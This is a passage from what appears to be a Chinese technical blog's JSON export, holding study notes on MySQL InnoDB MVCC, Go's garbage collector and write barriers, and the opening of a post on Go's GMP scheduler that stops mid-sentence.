头脑风暴：mvcc是一个概念，快照读是为了实现它。\n\n\n\n# 3. 实现\n\nMVCC的目的就是多版本并发控制，在数据库中的实现，就是为了解决读写冲突，它的实现原理主要是依赖记录中的 **4个隐式字段，undo日志 ，Read View 来实现的。**\n\n### 3.1 隐藏字段\n\nInnoDB存储引擎在每行数据的后面添加了隐藏字段：\n\n+ DB_ROW_ID 6byte, 隐含的自增ID（隐藏主键），如果数据表没有主键，InnoDB会自动以DB_ROW_ID产生一个聚簇索引。(这个DB_ROW_ID跟MVCC关系不大)。\n+ DB_TRX_ID 6byte, 最近修改(修改/插入)事务ID：记录创建这条记录/最后一次修改该记录的事务ID。\n+ DB_ROLL_PTR 7byte, 回滚指针，指向这条记录的上一个版本（存储于rollback segment里）。\n\n+ DELETED_BIT 1byte, 记录被更新或删除并不代表真的删除，而是删除flag变了\n\n<img src=\"mysql的mvcc实现原理/image-20230830133933752.png\" alt=\"image-20230830133933752\" style=\"zoom:50%;\" />\n\n如上图，DB_ROW_ID是数据库默认为该行记录生成的唯一隐式主键；DB_TRX_ID是当前操作该记录的事务ID； 而DB_ROLL_PTR是一个回滚指针，用于配合undo日志，指向上一个旧版本；delete flag没有展示出来。\n\n### 3.2 undo log    \n\nInnoDB把这些为了回滚而记录的这些东西称之为undo log。这里需要注意的一点是，由于查询操作（SELECT）并不会修改任何用户记录，所以在查询操作执行时，并不需要记录相应的undo log。undo log主要分为3种。\n\n+ Insert undo log ：插入一条记录时，至少要把这条记录的主键值记下来，之后回滚的时候只需要把这个主键值对应的记录删掉就好了。\n\n+ Update undo log：修改一条记录时，至少要把修改这条记录前的旧值都记录下来，这样之后回滚时再把这条记录更新为旧值就好了。\n\n+ Delete undo log：删除一条记录时，至少要把这条记录中的内容都记下来，这样之后回滚时再把由这些内容组成的记录插入到表中就好了。\n\n\n\n删除操作都只是设置一下老记录的DELETED_BIT，并不真正将过时的记录删除。\n\n为了节省磁盘空间，InnoDB有专门的purge线程来清理DELETED_BIT为true的记录。为了不影响MVCC的正常工作，purge线程自己也维护了一个read view（这个read view相当于系统中最老活跃事务的read view）;如果某个记录的DELETED_BIT为true，并且DB_TRX_ID相对于purge线程的read view可见，那么这条记录一定是可以被安全清除的。\n\n\n\n### 3.3 undo log 链\n\n**1. 插入**\n\n比如一个有个事务插入persion表插入了一条新记录，记录如下，name为Jerry, age为24岁，隐式主键是1，事务ID和回滚指针，我们假设为NULL\n\n<img src=\"mysql的mvcc实现原理/image-20230830134355265.png\" alt=\"image-20230830134355265\" style=\"zoom:40%;\" />\n\n**2. 修改1**\n\n现在来了一个事务1对该记录的name做出了修改，改为Tom\n\n<img src=\"mysql的mvcc实现原理/image-20230830134456119.png\" alt=\"image-20230830134456119\" style=\"zoom:40%;\" />\n\n+ 在事务1修改该行(记录)数据时，数据库会先对该行加排他锁\n\n+ 然后把该行数据拷贝到undo log中，作为旧记录，即在undo log中有当前行的拷贝副本\n\n+ 拷贝完毕后，修改该行name为Tom，并且修改隐藏字段的事务ID为当前事务1的ID, 我们默认从1开始，之后递增，回滚指针指向拷贝到undo log的副本记录，即表示我的上一个版本就是它。\n\n+ 事务提交后，释放锁\n\n**3.  修改2**\n\n又来了个事务2修改person表的同一个记录，将age修改为30岁\n\n<img src=\"mysql的mvcc实现原理/image-20230830134628379.png\" alt=\"image-20230830134628379\" style=\"zoom:40%;\" />\n\n+ 在事务2修改该行数据时，数据库也先为该行加锁\n+ 然后把该行数据拷贝到undo log中，作为旧记录，发现该行记录已经有undo log了，那么最新的旧数据作为链表的表头，插在该行记录的undo log最前面\n+ 修改该行age为30岁，并且修改隐藏字段的事务ID为当前事务2的ID, 那就是2，回滚指针指向刚刚拷贝到undo log的副本记录\n+ 事务提交，释放锁。\n\n\n\n从上面，我们就可以看出，不同事务或者相同事务的对同一记录的修改，会导致该记录的undo log成为一条记录版本线性表，即链表，undo log的链首就是最新的旧记录，链尾就是最早的旧记录。（当然就像之前说的该undo log的节点可能是会purge线程清除掉，向图中的第一条insert undo log，其实在事务提交之后可能就被删除丢失了，不过这里为了演示，所以还放在这里）\n\n### 3.4 Read View\n\n执行Select 语句时，对该记录创建一个Read View读视图，把它比作条件用来判断当前事务能够看到哪个版本的数据，即可能是当前最新的数据，也有可能是该行记录的undo log里面的某个版本的数据。\n\n\n\nRead View遵循一个可见性算法，主要是将要被修改的数据的最新记录中的 DB_TRX_ID（即当前事务ID）取出来，与系统当前其他活跃事务的ID去对比（由Read View维护），如果DB_TRX_ID跟Read View的属性做了某些比较，不符合可见性，那就通过DB_ROLL_PTR回滚指针去取出Undo Log中的DB_TRX_ID再比较，即遍历链表的DB_TRX_ID（从链首到链尾，即从最近的一次修改查起），直到找到满足特定条件的DB_TRX_ID, 那么这个DB_TRX_ID所在的旧记录就是当前事务能看见的最新老版本。\n\n**Read View 算法**\n\n我们可以把Read View简单的理解成有三个全局属性\n\n+ trx_list 未提交事务ID列表，用来维护Read View生成时刻系统正活跃的事务ID\n\n+ up_limit_id 记录trx_list列表中事务最小的ID\n\n+ low_limit_id ReadView生成时刻系统尚未分配的下一个事务ID，也就是目前已出现过的事务ID的最大值+1\n\n\n\n```bash\n1. 如果 DB_TRX_ID < up_limit_id, 那么表明最新修改该行的事务在当前事务创建快照之前就提交了，所以该记录行的值对当前事务是可见的。跳到步骤5。\n\n2. 如果 DB_TRX_ID >= low_limit_id, 那么表明最新修改该行的事务在当前事务创建快照之后才修改该行，所以该记录行的值对当前事务不可见。跳到步骤4。\n\n3. 如果 up_limit_id <= DB_TRX_ID < low_limit_id, 表明最新修改该行的事务在当前事务创建快照的时候可能处于“活动状态”或者“已提交状态”；所以就要对活跃事务列表trx_ids进行查找（源码中是用的二分查找，因为是有序的）：\n\n  3.1 如果在活跃事务列表trx_ids中能找到 id 为 DB_TRX_ID 的事务，表明①在当前事务创建快照前，该记录行的值被id为trx_id的事务修改了，但没有提交；或者②在当前事务创建快照后，该记录行的值被id为trx_id的事务修改了（不管有无提交）；这些情况下，这个记录行的值对当前事务都是不可见的，跳到步骤4；\n\n  3.2 在活跃事务列表中找不到，则表明id为 DB_TRX_ID 的事务在修改该记录行的值后，在当前事务创建快照前就已经提交了，所以记录行对当前事务可见，跳到步骤5。\n\n4. 在该记录行的 DB_ROLL_PTR 指针所指向的undo log回滚段中，取出最新的的旧事务号DB_TRX_ID, 将它赋给trx_id，然后跳到步骤1重新开始判断。\n\n5. 将该可见行的值返回。\n```\n\n\n\n### 3.5 整体流程\n\n|          |                |          |              |\n| -------- | -------------- | -------- | ------------ |\n| 事务1    | 事务2          | 事务3    | 事务4        |\n| 事务开始 | 事务开始       | 事务开始 | 事务开始     |\n| …        | …              | …        | 修改且已提交 |\n| 进行中   | **开始快照读** | 进行中   |              |\n| …        | …              | …        |              |\n\n<img src=\"mysql的mvcc实现原理/image-20230830135842844.png\" alt=\"image-20230830135842844\" style=\"zoom:40%;\" />\n\n当事务2对某行数据执行了快照读，数据库为该行数据生成一个Read View读视图，假设当前事务ID为2，此时还有事务1和事务3在活跃中，事务4在事务2快照读前一刻提交更新了，所以Read View记录了系统当前活跃事务1，3的ID，维护在一个列表上，我们称为trx_list。\n\n我们的例子中，只有事务4修改过该行记录，并在事务2执行快照读前，就提交了事务，所以当前该行当前数据的undo log如下图所示；我们的事务2在快照读该行记录的时候，就会拿该行记录的DB_TRX_ID去跟up_limit_id,low_limit_id和活跃事务ID列表(trx_list)进行比较，判断当前事务2能看到该记录的版本是哪个。\n\n<img src=\"mysql的mvcc实现原理/image-20230830135958846.png\" alt=\"image-20230830135958846\" style=\"zoom:40%;\" />\n\n1. 先拿该记录DB_TRX_ID字段记录的事务ID 4去跟Read View的的up_limit_id比较，看4是否小于up_limit_id，不符合条件。\n2. 继续判断 4 是否大于等于 low_limit_id(5)，也不符合条件。\n3. 最后判断4是否处于trx_list中的活跃事务, 最后发现事务ID为4的事务不在当前活跃事务列表中, 符合可见性条件。\n4. 所以事务4修改后提交的最新结果对事务2快照读时是可见的，所以事务2能读到的最新数据记录是事务4所提交的版本。\n\n<img src=\"mysql的mvcc实现原理/image-20230830140331751.png\" alt=\"image-20230830140331751\" style=\"zoom: 40%;\" />\n\n# 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/66791480\n+ https://zhuanlan.zhihu.com/p/52977862\n+ https://blog.csdn.net/Waves___/article/details/105295060\n+ https://pdai.tech/md/db/sql-mysql/sql-mysql-mvcc.html\n+ 索引 https://www.liuvv.com/p/84544518.html\n- 锁和事务 https://www.liuvv.com/p/9762ea3e.html\n- MVCC https://www.liuvv.com/p/a0f7945d.html\n","tags":["mysql"],"categories":["mysql"]},{"title":"golang的GC垃圾回收","url":"%2Fp%2F26aea798.html","content":"\n# 1. 常见的GC算法\n\nGC 是一种自动管理内存的技术，用来回收（释放） heap 中不再使用的对象。GC 过程中涉及到两个阶段：\n\n1. 区分活对象（live object）与垃圾对象（garbage）\n2.  回收垃圾对象的内存，使得程序可以重复使用这些内存\n\n<!-- more -->\n\n### 1.1 引用计数（Reference counting）\n\n根据对象自身的引用计数来回收，当引用计数归零时进行回收，但是计数频繁更新会带来更多开销，且无法解决循环引用的问题。\n\n- 优点：简单直接，回收速度快\n- 缺点：需要额外的空间存放计数，无法处理循环引用的情况；\n\n\n\n### 1.2 追踪技术（Tracing）\n\n这是目前使用范围最广的技术，一般我们提到 GC 都是指这类。\n\n这类 GC 从某些被称为 root 的对象开始，不断追踪可以被引用到的对象，这些对象被称为可到达的（reachable），其他剩余的对象就被称为 garbage，并且会被释放。\n\n##### 1. 标记清除\n\n标记出所有不需要回收的对象，在标记完成后统一回收掉所有未被标记的对象。\n\n- 优点：简单直接，速度快，适合可回收对象不多的场景。\n- 缺点：每次启动垃圾回收都会暂停当前所有的正常代码执行，回收是系统响应能力大大降低。标记需要扫描整个heap，清除数据会产生heap碎片。\n\n##### 2. 复制收集\n\n复制法将内存分为大小相同的两块，每次使用其中的一块，当这一块的内存使用完后，将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。\n\n- 优点：解决了内存碎片的问题，每次清除针对的都是整块内存，但是因为移动对象需要耗费时间，效率低于标记清除法；\n- 缺点：有部分内存总是利用不到，资源浪费，移动存活对象比较耗时，并且如果存活对象较多的时候，需要担保机制确保复制区有足够的空间可完成复制；\n\n##### 3. 标记整理\n\n标记过程同标记清除法，结束后将存活对象压缩至一端，然后清除边界外的内容。\n\n- 优点：解决了内存碎片的问题。\n- 缺点：性能低，因为在移动对象的时候不仅需要移动对象还要维护对象的引用地址，可能需要对内存经过几次扫描才能完成；\n\n##### 4.  分代式\n\n将对象根据存活时间的长短进行分类，存活时间小于某个值的为年轻代，存活时间大于某个值的为老年代，永远不会参与回收的对象为永久代。\n\n分配对象的时候从新生代里面分配，如果后面发现对象的生命周期较长，则将其移到老年代，这个过程叫做 promote。随着不断 promote，最后新生代的大小在整个堆的占用比例不会特别大。收集的时候集中主要精力在新生代就会相对来说效率更高，STW 时间也会更短。  \n\n# 2. Golang的GC\n\n### 2.1 版本演变\n\nGoV1.3- 普通标记清除法，整体过程需要启动STW，效率极低。\n\nGoV1.5- 三色标记法， 堆空间启动写屏障，栈空间不启动，全部扫描之后，需要重新扫描一次栈(需要STW)，效率普通。\n\nGoV1.8- 三色标记法，混合写屏障机制， 栈空间不启动，堆空间启动。整个过程几乎不需要STW，效率较高。\n\n### 2.2 Go V1.3 的标记清除\n\n##### 1. 具体步骤\n\n第一步，暂停程序业务逻辑，分类出可达和不可达的对象，然后做上标记。目前程序的可达对象有对象 1-2-3，对象 4-7 等五个对象。\n\n<img src=\"golang的GC垃圾回收/9OEzONr3qs.png\" alt=\"img\" style=\"zoom: 33%;\" />\n\n第二步 , 开始标记，程序找出它所有可达的对象，并做上标记。如下图所示：\n\n<img src=\"golang的GC垃圾回收/A9HoTXTRNX.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n第三步 , 标记完了之后，然后开始清除未标记的对象。结果如下。\n\n<img src=\"golang的GC垃圾回收/h6FhdaB3tV.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n操作非常简单，但是有一点需要额外注意：mark and sweep 算法在执行的时候，需要程序暂停！即 STW(stop the world)，STW 的过程中，CPU 不执行用户代码，全部用于垃圾回收，这个过程的影响很大，所以 STW 也是一些回收机制最大的难题和希望优化的点。所以在执行第三步的这段时间，程序会暂定停止任何工作，卡在那等待回收执行完毕。\n\n第四步 , 停止暂停，让程序继续跑。然后循环重复这个过程，直到 process 程序生命周期结束。\n\n##### 2. 缺点\n\n- STW，stop the world；让程序暂停，程序出现卡顿 **(重要问题)**；\n- 标记需要扫描整个 heap；\n- 清除数据会产生 heap 碎片。\n\n<img src=\"golang的GC垃圾回收/JyUqgIH2iM.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nGo V1.3 做了简单的优化，将 STW 的步骤提前，减少 STW 暂停的时间范围。如下所示\n\n<img src=\"golang的GC垃圾回收/du0WVdrwQw.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n上图主要是将 STW 的步骤提前了异步，因为在 Sweep 清除的时候，可以不需要 STW 停止，因为这些对象已经是不可达对象了，不会出现回收写冲突等问题。\n\n但是无论怎么优化，Go V1.3 都面临这个一个重要问题，就是 mark-and-sweep 算法会暂停整个程序 。\n\n### 2.3 Go V1.5 的三色标记\n\nGolang 中的垃圾回收主要应用三色标记法，GC 过程和其他用户 goroutine 可并发运行，但需要一定时间的 **STW(stop the world)**。\n\n##### 1. 具体步骤\n\n---\n\n**第一步** , 每次新创建的对象，默认的颜色都是标记为 “白色”，如图所示。\n\n<img src=\"golang的GC垃圾回收/IjRye1iH1U.png\" alt=\"img\" style=\"zoom: 33%;\" />\n\n我们的程序可抵达的内存对象关系如左图所示，右边的标记表，是用来记录目前每个对象的标记颜色分类。这里面需要注意的是，所谓 “程序”，则是一些对象的跟节点集合。所以我们如果将 “程序” 展开，会得到类似如下的表现形式，如下图所示。\n\n<img src=\"golang的GC垃圾回收/wpPtS71PWu.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n---\n\n**第二步** , 每次 GC 回收开始，会从根节点开始遍历所有对象，把遍历到的对象从白色集合放入 “灰色” 集合如图所示。\n\n<img src=\"golang的GC垃圾回收/QWZrAuef2t.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n这里 要注意的是，本次遍历是一次遍历，非递归形式，是从程序抽次可抵达的对象遍历一层，如上图所示，当前可抵达的对象是对象 1 和对象 4，那么自然本轮遍历结束，对象 1 和对象 4 就会被标记为灰色，灰色标记表就会多出这两个对象。\n\n---\n\n**第三步** , 遍历灰色集合，将灰色对象引用的对象从白色集合放入灰色集合，之后将此灰色对象放入黑色集合，如图所示。\n\n<img src=\"golang的GC垃圾回收/6KYOsOOUr5.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n这一次遍历是只扫描灰色对象，将灰色对象的第一层遍历可抵达的对象由白色变为灰色，如：对象 2、对象 7. 而之前的灰色对象 1 和对象 4 则会被标记为黑色，同时由灰色标记表移动到黑色标记表中。\n\n---\n\n**第四步** , 重复第三步 , 直到灰色中无任何对象，如图所示。\n\n<img src=\"golang的GC垃圾回收/PouBtxPAp0.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/ikQyJgeamK.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n当我们全部的可达对象都遍历完后，灰色标记表将不再存在灰色对象，目前全部内存的数据只有两种颜色，黑色和白色。那么黑色对象就是我们程序逻辑可达（需要的）对象，这些数据是目前支撑程序正常业务运行的，是合法的有用数据，不可删除，白色的对象是全部不可达对象，目前程序逻辑并不依赖他们，那么白色对象就是内存中目前的垃圾数据，需要被清除。\n\n---\n\n**第五步**: 回收所有的白色标记表的对象。也就是回收垃圾，如图所示。\n\n以上我们将全部的白色对象进行删除回收。\n\n<img src=\"golang的GC垃圾回收/7nW3dpe38I.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n剩下的就是全部依赖的黑色对象。\n\n以上便是三色并发标记法，不难看出，我们上面已经清楚的体现三色的特性。但是这里面可能会有很多并发流程均会被扫描，执行并发流程的内存可能相互依赖，为了在 GC 过程中保证数据的安全，我们在开始三色标记之前就会加上 STW，在扫描确定黑白对象之后再放开 STW。但是很明显这样的 GC 扫描的性能实在是太低了。\n\n如果不进行 STW，如下并发情况下，会误删白色对象。\n\n- 条件 1: 一个白色对象被黑色对象引用 **(白色被挂在黑色下)**\n- 条件 2: 灰色对象与它之间的可达关系的白色对象遭到破坏 **(灰色同时丢了该白色)**\n\n### 2.4  屏障机制介绍\n\n我们让 GC 回收器，满足下面两种情况之一时，即可保对象不丢失。 这两种方式就是 “强三色不变式” 和 “弱三色不变式”。\n\n##### 1. 强三色不变式\n\n强三色不变色实际上是强制性的不允许黑色对象引用白色对象，这样就不会出现有白色对象被误删的情况。\n\n<img src=\"golang的GC垃圾回收/wvSogXGNIF.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n##### 2. 弱三色不变式\n\n弱三色不变式强调，黑色对象可以引用白色对象，但是这个白色对象必须存在其他灰色对象对它的引用，或者可达它的链路上游存在灰色对象。 这样实则是黑色对象引用白色对象，白色对象处于一个危险被删除的状态，但是上游灰色对象的引用，可以保护该白色对象，使其安全。\n\n为了遵循上述的两个方式，GC 算法演进到两种屏障方式，他们 “插入屏障”, “删除屏障”。\n\n<img src=\"golang的GC垃圾回收/QGq9avk8AH.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n##### 3. 插入写屏障\n\n+  在 A 对象引用 B 对象的时候，B 对象被标记为灰色。(将 B 挂在 A 下游，B 必须被标记为灰色)\n+ 满足强三色不变式. (不存在黑色对象引用白色对象的情况了， 因为白色会强制变成灰色)\n\n栈空间的特点是容量小，但是要求相应速度快，因为函数调用弹出频繁使用，**所以 “插入屏障” 机制，在栈空间的对象操作中不使用， 而仅仅使用在堆空间对象的操作中。**\n\n<img src=\"golang的GC垃圾回收/5BmQjsbkUd.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n<img src=\"golang的GC垃圾回收/v0BdIRgWkX.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/CHoU7xt2Rh.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/QU8enG8Y7i.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/yz984t2qgC.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/ksISy2L0hA.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n但是如果栈不添加，当全部三色标记扫描之后，栈上有可能依然存在白色对象被引用的情况 (如上图的对象 9). 所以要对栈重新进行三色标记扫描，但这次为了对象不丢失，要对本次标记扫描启动 STW 暂停。直到栈空间的三色标记结束。\n\n<img src=\"golang的GC垃圾回收/PZoaRVvQXM.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golang的GC垃圾回收/4qvHtIg4tx.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/EaR0qIfUtL.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n最后将栈和堆空间 扫描剩余的全部 白色节点清除。这次 STW 大约的时间在 10~100ms 间。\n\n<img src=\"golang的GC垃圾回收/jx99HZvdns.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n##### 4. 删除写屏障\n\n+ 被删除的对象，如果自身为白色或灰色，那么被标记为灰色。\n+ 满足弱三色不变式. (保护灰色对象到白色对象的路径不会断)\n\n<img src=\"golang的GC垃圾回收/jw5V3ViFnp.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golang的GC垃圾回收/rAQjRB9EmR.jpeg\" alt=\"img\" style=\"zoom: 50%;\" />\n\n<img src=\"golang的GC垃圾回收/jek807jJzT.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"golang的GC垃圾回收/KRD44mSOwQ.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n<img src=\"https://cdn.learnku.com/uploads/images/202205/23/58489/Ze3RIBDzso.jpeg!large\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golang的GC垃圾回收/dWE31AVl3s.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"golang的GC垃圾回收/tCHIzooK1p.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n这种方式的回收精度低，一个对象即使被删除了最后一个指向它的指针也依旧可以活过这一轮，在下一轮 GC 中被清理掉。\n\n### 2.5 Go V1.8 的混合写屏障机制\n\n##### 1. 插入写屏障和删除写屏障的短板\n\n- 插入写屏障：结束时需要 STW 来重新扫描栈，标记栈上引用的白色对象的存活；\n- 删除写屏障：回收精度低，GC 开始时 STW 扫描堆栈来记录初始快照，这个过程会保护开始时刻的所有存活对象。\n\nGo V1.8 版本引入了混合写屏障机制（hybrid write barrier），避免了对栈再次扫描的过程，极大的减少了 STW 的时间。结合了两者的优点。\n\n##### 2. 混合写屏障规则\n\n1、GC 开始将栈上的对象全部扫描并标记为黑色 (之后不再进行第二次重复扫描，无需 STW)\n\n2、GC 期间，任何在栈上创建的新对象，均为黑色。\n\n3、被删除的对象标记为灰色。\n\n4、被添加的对象标记为灰色。\n\n\n\n有人，栈上一直是黑色的对象，那么不就永远清除不掉了么。这里强调一下，标记为黑色的是可达对象，不可达的对象一直会是白色，直到最后被回收。\n\nGolang 中的混合写屏障满足弱三色不变式，结合了删除写屏障和插入写屏障的优点，只需要在开始时并发扫描各个 goroutine 的栈，使其变黑并一直保持，这个过程不需要 STW，而标记结束后，因为栈在扫描后始终是黑色的，也无需再进行再次扫描操作了，减少了 STW 的时间。\n\n混合写屏障是 GC 的一种屏障机制，所以只是当程序执行 GC 的时候，才会触发这种机制。\n\n### 2.6 何时触发 GC\n\n+ 主动触发：调用 runtime.GC()，这是阻塞式的。\n+ 被动触发百分比：在堆上分配大于 32K byte 对象的时候，检测此时是否满足垃圾回收条件，如果满足则进行垃圾回收。默认情况下为 100，即堆内存相比上次垃圾收集增长 100% 时应该触发 GC\n\n+ 被动触发定时： 如果超过两分钟没有 GC，则触发 GC。监控函数是 `sysmon()`，在主 goroutine 中启动。\n\n# 3. 头脑风暴\n\n+ golang1.3之前是标记清扫，先标记再清扫，会STW，程序停止影响效率。\n+ golang1.5加入三色标记，gc和gorutine可以并发，但是也会STW。三色是黑，白，灰。\n+ 首先默认全是白色，根节点扫到就变灰。只扫一层不是递归的扫，然后开始扫灰色，把扫到的也变灰，自己变黑。流程一直循环，直到全部变黑。白色的被清理。（缺点是扫的时候需要STW，扫完后再解除）\n+ 插入写屏障：在GC过程中，新创建的直接灰色，但是只在堆空间，结束后还要再重新标记一次栈空间。\n+ 删除写屏障：在GC过程中，删除的如果是白色直接变灰色，因为它可能引用的其他白色，防止误删。\n+ 混合写屏障:  GC刚开始，栈上全部黑色，添加全是黑色。堆空间删除为灰，添加也为灰。\n+ 何时触发GC:  1: 主动触发，runtime.GC 2：被动触发:  在堆上分配32KB的时候就检查上次超过100% 3: 两分钟一次GC。\n\n\n\n# 4. 参考资料\n\n+ https://learnku.com/articles/68141\n+ https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-garbage-collector/\n+ https://cloud.tencent.com/developer/article/1916989\n+ https://www.cnblogs.com/luozhiyun/p/14564903.html\n+ https://liqingqiya.github.io/golang/gc/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/%E5%86%99%E5%B1%8F%E9%9A%9C/2020/07/24/gc5.html","tags":["gc"],"categories":["2_golang底层"]},{"title":"golang的GMP调度模型","url":"%2Fp%2Fc8d0853c.html","content":"\n# 1. 基础术语\n\n### 1.1 并发和并行\n\n+ 并发: 一个cpu上能同时执行多项任务，在很短时间内，cpu来回切换任务执行(在某段很短时间内执行程序a，然后又迅速得切换到程序b去执行)，有时间上的重叠（宏观上是同时的，微观仍是顺序执行）,这样看起来多个任务像是同时执行，这就是并发。\n\n+ 并行: 当系统有多个CPU时,每个CPU同一时刻都运行任务，互不抢占自己所在的CPU资源，同时进行，称为并行。\n\n\n<img src=\"golang的GMP调度模型/5-并发与并行.jpg\" alt=\"img\" style=\"zoom:67%;\" />\n\n<!-- more -->\n\n### 1.2 进程，线程和协程\n\n+ **进程**: CPU 在切换程序的时候，如果不保存上一个程序的状态（也就是我们常说的context--上下文），直接切换下一个程序，就会丢失上一个程序的一系列状态，于是引入了进程这个概念，用以划分好程序运行时所需要的资源。因此进程就是一个程序运行时候的所需要的基本资源单位（也可以说是程序运行的一个实体）。\n+ **线程**: CPU 切换多个进程的时候，会花费不少的时间，因为切换进程需要切换到内核态，而每次调度需要内核态都需要读取用户态的数据，进程一旦多起来，CPU 调度会消耗一大堆资源，因此引入了线程的概念，线程本身几乎不占有资源，他们共享进程里的资源，内核调度起来不会那么像进程切换那么耗费资源。\n+ **协程**: 协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈。因此，协程能保留上一次调用时的状态（即所有局部状态的一个特定组合），每次过程重入时，就相当于进入上一次调用的状态，换种说法：进入上一次离开时所处逻辑流的位置。线程和进程的操作是由程序触发系统接口，最后的执行者是系统；协程的操作执行者则是用户自身程序。\n\n\n\n# 2. 协程\n\n### 2.1 协程引出原因\n\n一个线程分为 “内核态 “线程和” 用户态 “线程。\n\n一个 “用户态线程” 必须要绑定一个 “内核态线程”，但是 CPU 并不知道有 “用户态线程” 的存在，它只知道它运行的是一个 “内核态线程”(Linux 的 PCB 进程控制块)。\n\n<img src=\"golang的GMP调度模型/TfStmYsfyF.png\" alt=\"8-线程的内核和用户态.png\" style=\"zoom: 33%;\" />\n\n这样，我们再去细化去分类一下，内核线程依然叫 “线程 (thread)”，用户线程叫 “协程 (co-routine)”.\n\n<img src=\"golang的GMP调度模型/vgzlKzvOUL.png\" alt=\"9-协程和线程.png\" style=\"zoom:33%;\" />\n\n\n\n 看到这里，我们就要开脑洞了，既然一个协程 (co-routine) 可以绑定一个线程 (thread)，那么能不能多个协程 (co-routine) 绑定一个或者多个线程 (thread) 上呢。\n\n\n\n### 2.2 进程和协程绑定关系\n\n##### N:1 关系\n\nN 个协程绑定 1 个线程，优点就是协程在用户态线程即完成切换，不会陷入到内核态，这种切换非常的轻量快速。但也有很大的缺点，1 个进程的所有协程都绑定在 1 个线程上。一旦某协程阻塞，造成线程阻塞，本进程的其他协程都无法执行了，根本就没有并发的能力了。\n\n##### 1:1 关系\n\n1 个协程绑定 1 个线程，这种最容易实现。协程的调度都由 CPU 完成了，协程的创建、删除和切换的代价都由 CPU 完成，有点略显昂贵了。协程就没有意义了。\n\n##### M:N 关系\n\n<img src=\"golang的GMP调度模型/kfPbThcyRU.png\" alt=\"10-N-1关系.png\" style=\"zoom: 33%;\" />\n\n协程跟线程是有区别的，线程由 CPU 调度是抢占式的，协程由用户态调度是**协作式**的，一个协程让出 CPU 后，才执行下一个协程。\n\n\n\n### 2.3 协程的意义\n\ngoroutine是Go语言实现的用户态线程，主要用来解决操作系统线程太“重”的问题，所谓的太重，主要表现在以下两个方面：\n\n- 创建和切换太重：操作系统线程的创建和切换都需要进入内核，而进入内核所消耗的性能代价比较高，开销较大；\n- 内存使用太重：一方面，为了尽量避免极端情况下操作系统线程栈的溢出，内核在创建操作系统线程时默认会为其分配一个较大的栈内存（虚拟地址空间，内核并不会一开始就分配这么多的物理内存），然而在绝大多数情况下，系统线程远远用不了这么多内存，这导致了浪费；另一方面，栈内存空间一旦创建和初始化完成之后其大小就不能再有变化，这决定了在某些特殊场景下系统线程栈还是有溢出的风险。\n\n相对的，用户态的goroutine则轻量得多：\n\n- goroutine是用户态线程，其创建和切换都在用户代码中完成而无需进入操作系统内核，所以其开销要远远小于系统线程的创建和切换；\n- goroutine启动时默认栈大小只有2k，这在多数情况下已经够用了，即使不够用，goroutine的栈也会自动扩大，同时，如果栈太大了过于浪费它还能自动收缩，这样既没有栈溢出的风险，也不会造成栈内存空间的大量浪费。\n\n### 2.4 工作原理\n\ngoroutine建立在操作系统线程基础之上，它与操作系统线程之间实现了一个多对多(M:N) 的两级线程模型。\n\n这里的 M:N 是指M个goroutine运行在N个操作系统线程之上，内核负责对这N个操作系统线程进行调度，而这N个系统线程又负责对这M个goroutine进行调度和运行。\n\n所谓的对goroutine的调度，是指程序代码按照一定的算法在适当的时候挑选出合适的goroutine并放到CPU上去运行的过程，这些负责对goroutine进行调度的程序代码我们称之为goroutine调度器。\n\n\n\n\n# 3. GMP调度模型\n\n### 3.1 GMP(goroutine，thread，processor)\n\nprocessor[处理器]，它包含了运行 goroutine 的资源，如果线程想运行 goroutine，必须先获取 P。P 中还包含了可运行的 G 队列。\n\nthread 是运行 goroutine 的实体，goroutine调度器的功能是把可运行的 goroutine 分配到工作线程上。\n\n<img src=\"golang的GMP调度模型/Ugu3C2WSpM.jpeg\" alt=\"16-GMP-调度.png\" style=\"zoom:67%;\" />\n\n+ 全局队列（Global Queue）：存放等待运行的 G。\n+ P 的本地队列：同全局队列类似，存放的也是等待运行的 G，存的数量有限，最多可存放256个G。新建 G’时，G’优先加入到 P 的本地队列，如果队列满了，则会把本地队列中一半的 G 移动到全局队列。\n+ P 列表：所有的 P 都在程序启动时创建，并保存在数组中，最多有 GOMAXPROCS(可配置) 个。\n+ M：**线程想运行任务就得获取 P，从 P 的本地队列获取 G，P 队列为空时，M 也会尝试从全局队列拿一批 G 放到 P 的本地队列，拿不到就从其他 